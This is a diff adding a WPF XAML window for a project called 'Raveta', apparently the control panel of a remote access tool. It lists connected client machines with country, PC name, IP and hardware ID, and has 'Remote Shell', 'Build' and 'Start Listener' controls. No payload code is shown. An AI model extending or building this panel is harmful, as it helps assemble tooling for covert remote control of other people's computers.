@@ -1,0 +1,69 @@
+﻿<Window
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        x:Class="Raveta.MainWindow"
+        mc:Ignorable="d"
+        Title="MainWindow" Height="310" Width="815" WindowStyle="None"
+        Background="#26B0B0FF"
+		AllowsTransparency="True"
+		BorderThickness="0"
+        ResizeMode="NoResize"
+		WindowStartupLocation="CenterScreen"
+        Loaded="Window_Loaded" Visibility="Visible">
+
+    <Grid Height="353" VerticalAlignment="Bottom">
+
+        <StackPanel Margin="0,44,-5,286" MouseDown="StackPanel_MouseDown" Grid.ColumnSpan="2">
+            <StackPanel.Background>
+                <LinearGradientBrush EndPoint="0.5,1" StartPoint="0.5,0">
+                    <GradientStop Color="#FF8AAFCC" Offset="0.004"/>
+                    <GradientStop Color="#FF0078D8" Offset="1"/>
+                </LinearGradientBrush>
+            </StackPanel.Background>
+        </StackPanel>
+
+
+        <ListView x:Name="Connections" d:ItemsSource="{d:SampleData ItemCount=0}" Opacity="0.95" Margin="7,105,10,10" BorderBrush="Black" Foreground="Black" Background="White">
+            <ListView.ContextMenu>
+                <ContextMenu>
+                    <MenuItem Header="Reconnect Client" Click="ReconnectClientClick" />
+                    <MenuItem Header="Remote Shell" Click="RemoteShellClick" />
+                </ContextMenu>
+            </ListView.ContextMenu>
+            <ListView.View>
+                <GridView x:Name="ConnectionsGrid">
+                    <GridViewColumn x:Name="ClientGroup" Header="Client Group" DisplayMemberBinding="{Binding ClientGroup}" Width="100"/>
+                    <GridViewColumn x:Name="Country" Header="Country" DisplayMemberBinding="{Binding Country}" Width="130"/>
+                    <GridViewColumn x:Name="PCName" Header="PC Name" DisplayMemberBinding="{Binding PCName}" Width="150"/>
+                    <GridViewColumn x:Name="IPAddress" Header="Ip Address" DisplayMemberBinding="{Binding IPAddress}" Width="110"/>
+                    <GridViewColumn x:Name="HardwareID" Header="Hardware ID" DisplayMemberBinding="{Binding HardwareID}" Width="225"/>
+
+                </GridView>
+            </ListView.View>
+        </ListView>
+
+
+        <TextBox x:Name="_IPAddress" PreviewTextInput="NumberValidationIP" HorizontalAlignment="Left" Margin="75,77,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="77" Foreground="Black" MaxLength="15" Text="127.0.0.1" Height="19"/>
+        <TextBox x:Name="Port" PreviewTextInput="NumberValidationPort" HorizontalAlignment="Left" Margin="634,77,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="90" Foreground="Black" MaxLength="5" Text="1302" Height="19"/>
+        <Label Content="IP Address" HorizontalAlignment="Left" Margin="7,73,0,0" VerticalAlignment="Top" Foreground="#FFCED5D6"/>
+        <Button x:Name="Build" Content="Build" HorizontalAlignment="Left" Margin="362,77,0,0" VerticalAlignment="Top" Width="44" Height="19" Background="White" Click="Build_Click" FontSize="11"/>
+
+        <TextBox x:Name="_Port" PreviewTextInput="NumberValidationPort" HorizontalAlignment="Left" Margin="188,77,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="62" Foreground="Black" Height="19" MaxLength="5" Text="1302"/>
+        <Label Content="Port" HorizontalAlignment="Left" Margin="154,73,0,0" VerticalAlignment="Top" Width="43" Foreground="#FFCED5D6"/>
+        <Label Content="Port" HorizontalAlignment="Left" Margin="602,73,0,0" VerticalAlignment="Top" Foreground="#FFCED5D6"/>
+        <Button x:Name="AddHost_Copy" Content="Start Listener" HorizontalAlignment="Left" Margin="732,77,0,0" VerticalAlignment="Top" Width="72" RenderTransformOrigin="1.503,0.752" Height="19" Click="AddHost_Copy_Click" Background="White" FontSize="11"/>
+        <TextBox x:Name="_Group" PreviewTextInput="NumberValidationPort" HorizontalAlignment="Left" Margin="294,77,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="62" Foreground="Black" Height="19" MaxLength="25" Text="Office"/>
+        <Label Content="Group" HorizontalAlignment="Left" Margin="249,73,0,0" VerticalAlignment="Top" Width="43" Foreground="#FFCED5D6"/>
+
+
+
+    </Grid>
+
+
+
+
+
+</Window>
+
